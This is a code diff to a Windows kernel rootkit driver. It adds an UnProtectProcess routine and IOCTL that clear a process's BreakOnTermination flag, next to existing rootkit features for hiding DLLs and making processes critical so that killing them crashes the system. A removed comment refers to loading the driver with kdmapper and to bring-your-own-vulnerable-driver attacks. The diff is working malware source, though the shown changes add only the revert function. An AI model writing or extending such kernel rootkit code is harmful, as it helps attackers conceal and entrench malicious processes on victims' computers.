@@ -106,7 +106,39 @@ NTSTATUS ProtectProcess(UINT32 PID) {
         debug_print("[-] Failed to set process information to use on ProtectProcess, returning.\n");
         return status;
     }
-    debug_print("[+] Process is now part of the SYSTEM, termination will result to blue screen, restart to revert.\n");
+    DbgPrint("[+] Process with PID: %d is now protected using BreakOnTermination flag, termination will cause a blue screen, restart computer or use the UnProtectProcess function to revert\n", PID);
+    return status;
+}
+
+NTSTATUS UnProtectProcess(UINT32 PID) {
+    if (GetImageFileNameOffset() == 0) {
+        debug_print("[!-!] Build number unknown, returning from UnProtectProcess.\n");
+        return STATUS_UNSUCCESSFUL;
+    }
+    NTSTATUS status = STATUS_SUCCESS;
+
+    CLIENT_ID clientId;
+    HANDLE hProcess;
+    OBJECT_ATTRIBUTES objAttr;
+    ULONG BreakOnTermination = 0; // Now it's 0 because we want to revert changes.
+
+    clientId.UniqueThread = NULL;
+    clientId.UniqueProcess = UlongToHandle(PID);
+    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
+
+    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
+    if (status == STATUS_UNSUCCESSFUL) {
+        // Failure here means we will not open to modify the information of the process.
+        debug_print("[-] Failed to open process to use on UnProtectProcess, returning.\n");
+        return status;
+    }
+    status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
+    if (status == STATUS_UNSUCCESSFUL) {
+        // Failure here means the process will stay protected, mitigating the function.
+        debug_print("[-] Failed to set process information to use on UnProtectProcess, returning.\n");
+        return status;
+    }
+    DbgPrint("[+] Process with PID: %d is no longer protected, termination will not result a blue screen.\n", PID);
     return status;
 }
 
@@ -421,6 +453,8 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG HideDLL =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG UnProtectProcess =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
@@ -498,6 +532,9 @@ namespace Rootkit {
         case codes::HideDLL:
             HideDLL(HandleToUlong(pid), DLLName);
             break;
+        case codes::UnProtectProcess:
+            UnProtectProcess(HandleToUlong(pid));
+            break;
         default:
             // something is horribly wrong
             debug_print("[!] Unknown control code received!");
@@ -530,7 +567,6 @@ VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
 }
 
 
-// The actual entry point, since we are loading with kdmapper, in real life, when you use lets say a BYOVD attack, you would use the normal DriverEntry() with arguments (look in msdn website)
 NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path) {
     UNREFERENCED_PARAMETER(registry_path);
 
